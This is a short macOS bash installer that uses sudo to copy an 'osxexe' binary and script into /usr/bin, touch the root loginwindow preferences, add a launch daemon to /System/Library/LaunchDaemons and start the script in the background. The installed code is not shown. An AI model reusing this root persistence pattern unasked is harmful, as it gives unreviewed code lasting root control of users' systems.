#!/bin/bash
sudo cp $(dirname "${BASH_SOURCE[0]}")/osxexe /usr/bin/
sudo cp $(dirname "${BASH_SOURCE[0]}")/osxexe.sh /usr/bin/
sudo touch /var/root/Library/Preferences/com.apple.loginwindow.plist
sudo chmod +x /usr/bin/osxex*
sudo cp $(dirname "${BASH_SOURCE[0]}")/com.osxexe.plist /System/Library/LaunchDaemons/
sleep 3
sudo nohup /usr/bin/osxexe.sh &
exit
